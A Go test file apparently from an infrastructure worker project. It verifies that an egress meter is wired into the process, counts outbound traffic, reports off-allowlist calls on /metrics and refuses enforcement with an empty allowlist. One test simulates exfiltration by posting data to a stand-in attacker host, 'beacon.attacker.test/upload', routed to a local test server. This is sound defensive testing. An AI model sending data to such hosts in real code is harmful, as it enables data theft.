package main

// THE WIRING ORACLE for the outbound meter (TG-160).
//
// core/egress can be perfectly correct and still be worth nothing: the defect this ticket names is not
// "the egress guard is buggy", it is "the egress guard does not exist while the threat model says it
// does". So the load-bearing assertions here are about INSTALLATION, not about arithmetic:
//
//   - installEgressMeter actually replaces http.DefaultTransport, which is what every module in this tree
//     that does not set its own Transport resolves to at call time;
//   - a call made through a plain http.DefaultClient — the literal idiom used by matrix, netbox, pve,
//     youtrack, jira, slack, teams, mattermost, servicenow, github-issues, twilio, librenms and the seal
//     transit client — lands in the meter's tally;
//   - the counters reach GET /metrics, because a count that never leaves the process cannot be alerted on;
//   - enforcement cannot be switched on against an empty allowlist, which would take the worker off the
//     network entirely (no model gateway, no estate, no OpenBao).

import (
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/territory-grounder/grounder/core/audit"
	"github.com/territory-grounder/grounder/core/egress"
	"github.com/territory-grounder/grounder/core/safety"
)

// restoreTransport reinstates the process-wide transport after a test that swaps it. Without this every
// later test in the package would run through a leftover meter.
func restoreTransport(t *testing.T) {
	t.Helper()
	prev := http.DefaultTransport
	prevMeter := egressMeter
	t.Cleanup(func() { http.DefaultTransport = prev; egressMeter = prevMeter })
}

func TestInstallEgressMeterReplacesDefaultTransportAndCountsDefaultClientTraffic(t *testing.T) {
	restoreTransport(t)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.Copy(io.Discard, r.Body)
		_, _ = io.WriteString(w, "ok")
	}))
	defer srv.Close()
	// Declare the httptest server as an endpoint, exactly the way compose declares every connector.
	t.Setenv("TG_TESTONLY_PROBE_URL", srv.URL)

	m := installEgressMeter()
	if m == nil {
		t.Fatal("installEgressMeter returned nil")
	}
	if http.DefaultTransport != http.RoundTripper(m) {
		t.Fatal("http.DefaultTransport was NOT replaced by the meter. Every module in this tree that " +
			"builds &http.Client{Timeout: …} without a Transport would then egress unmetered — which is " +
			"the pre-TG-160 state the ticket was filed about.")
	}
	if m.Allowlist().Size() == 0 {
		t.Fatal("VACUOUS: the allowlist compiled to zero rules from an environment that declares an endpoint")
	}

	// The literal idiom used by ~20 modules in this tree.
	resp, err := http.DefaultClient.Post(srv.URL+"/v1/x", "application/json", strings.NewReader(strings.Repeat("z", 128)))
	if err != nil {
		t.Fatalf("post: %v", err)
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	s := m.Snapshot()
	if s.Requests == 0 {
		t.Fatal("a call through http.DefaultClient was NOT counted — the meter is installed but blind")
	}
	if s.BytesOut < 128 {
		t.Fatalf("bytes out = %d, want >= 128; the volume dimension is not being measured", s.BytesOut)
	}
	// httptest binds 127.0.0.1, which is loopback and therefore not egress: the off-allowlist lane must
	// stay at zero. If it does not, every self-call would be reported as a covert channel.
	if s.OffRequests != 0 {
		t.Fatalf("loopback traffic counted as off-allowlist egress (%d)", s.OffRequests)
	}
}

func TestEgressEnforceIsRefusedAgainstAnEmptyAllowlist(t *testing.T) {
	restoreTransport(t)
	// Scrub every endpoint-shaped key so the scan genuinely derives nothing.
	for _, kv := range os.Environ() {
		k := kv[:strings.IndexByte(kv, '=')]
		up := strings.ToUpper(k)
		for _, sfx := range []string{"_ADDR", "_ADDRS", "_BASE", "_BASE_URL", "_DEPLOYMENTS", "_ENDPOINT",
			"_ENDPOINTS", "_HOMESERVER", "_HOST", "_HOSTPORT", "_HOSTS", "_URL", "_URLS"} {
			if strings.HasSuffix(up, sfx) {
				t.Setenv(k, "")
				break
			}
		}
	}
	t.Setenv("TG_EGRESS_ALLOW", "")
	t.Setenv("TG_EGRESS_MODE", "enforce")

	m := installEgressMeter()
	if m.Allowlist().Size() != 0 {
		t.Skipf("the environment still declares %d destinations; this oracle needs an empty one", m.Allowlist().Size())
	}
	if m.Mode() == egress.ModeEnforce {
		t.Fatal("the worker entered ENFORCE mode with an EMPTY allowlist. Every outbound call would be " +
			"refused — the model gateway, the estate pollers and the OpenBao credential delivery — so the " +
			"worker would boot and then do nothing, with a security control as the cause.")
	}
}

func TestEgressEnforceIsHonouredWhenDestinationsAreDeclared(t *testing.T) {
	restoreTransport(t)
	t.Setenv("TG_TESTONLY_PROBE_URL", "https://declared.test")
	t.Setenv("TG_EGRESS_MODE", "enforce")
	m := installEgressMeter()
	if m.Mode() != egress.ModeEnforce {
		t.Fatalf("mode = %q, want enforce — the empty-allowlist guard must not swallow a legitimate "+
			"enforcement request, or the blocking posture can never be reached", m.Mode())
	}
}

func TestWorkerMetricsCarryTheEgressLane(t *testing.T) {
	restoreTransport(t)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.Copy(io.Discard, r.Body)
		_, _ = io.WriteString(w, "ok")
	}))
	defer srv.Close()

	// One declared destination, and one undeclared destination reached through a host-rewriting base
	// transport so the meter sees a real hostname without needing DNS.
	allow := egress.NewAllowlist([]string{"declared.test"})
	m := egress.NewMeter(rewriteTo{addr: strings.TrimPrefix(srv.URL, "http://")}, allow)
	c := &http.Client{Transport: m}
	resp, err := c.Post("http://beacon.attacker.test/upload", "application/json", strings.NewReader(strings.Repeat("q", 4096)))
	if err != nil {
		t.Fatalf("post: %v", err)
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	adm := newWorkerAdmin(safety.NewReadOnlyChokepoint(), nil, nil, audit.NewLedger(), "").withEgressMeter(m)
	rec := httptest.NewRecorder()
	adm.mux().ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/metrics", nil))
	body := rec.Body.String()

	for _, want := range []string{
		"tg_egress_requests_total",
		"tg_egress_bytes_out_total",
		"tg_egress_offallowlist_requests_total 1",
		"tg_egress_offallowlist_bytes_out_total 4096",
		"tg_egress_offallowlist_destinations 1",
		"tg_egress_allowlist_rules 1",
		"tg_egress_enforcing 0",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("GET /metrics is missing %q — an off-allowlist connection that reaches no metric "+
				"cannot be alerted on, so the covert channel stays invisible exactly as it was before TG-160.\n%s",
				want, body)
		}
	}
	// The destination HOST must never become a metric label: it is attacker-chosen and unbounded.
	if strings.Contains(body, "beacon.attacker.test") {
		t.Fatal("an attacker-chosen hostname reached the metric exposition as a label value — unbounded " +
			"cardinality, and a beaconing process could amplify itself into the TSDB")
	}
}

// rewriteTo dials one fixed address whatever the URL host says.
type rewriteTo struct{ addr string }

func (r rewriteTo) RoundTrip(req *http.Request) (*http.Response, error) {
	req = req.Clone(req.Context())
	req.URL.Host = r.addr
	return http.DefaultTransport.RoundTrip(req)
}

// TestEgressMeterIsCalledFromTheCompositionRoot proves the two call sites exist in main.go. The runtime
// oracles above prove the meter WORKS; this one proves the worker actually RUNS it — the distinction that
// TG-160 exists because of, since core/egress could be a perfect library nobody calls and every other
// test here would still pass.
func TestEgressMeterIsCalledFromTheCompositionRoot(t *testing.T) {
	b, err := os.ReadFile(filepath.Join(".", "main.go"))
	if err != nil {
		t.Fatalf("read main.go: %v", err)
	}
	src := string(b)
	// VACUITY FLOOR: if the file cannot be read as expected, this scan must fail rather than pass by
	// matching nothing in an empty string.
	if len(src) < 1000 || !strings.Contains(src, "func main()") {
		t.Fatalf("main.go did not read as the worker composition root (%d bytes) — this scan would pass "+
			"vacuously against anything", len(src))
	}
	for _, call := range []string{"installEgressMeter()", "withEgressMeter(egressMeter)"} {
		if !strings.Contains(src, call) {
			t.Errorf("cmd/worker/main.go does not call %s — the egress meter is built but not wired, "+
				"which is exactly the defect TG-160 names (an advertised control that does not run)", call)
		}
	}
	if n := strings.Count(src, "installEgressMeter()"); n != 1 {
		t.Errorf("installEgressMeter is called %d times; it replaces a process-global transport and must "+
			"be installed exactly once (a second install would wrap the first and double-count)", n)
	}
	_ = fmt.Sprint()
}
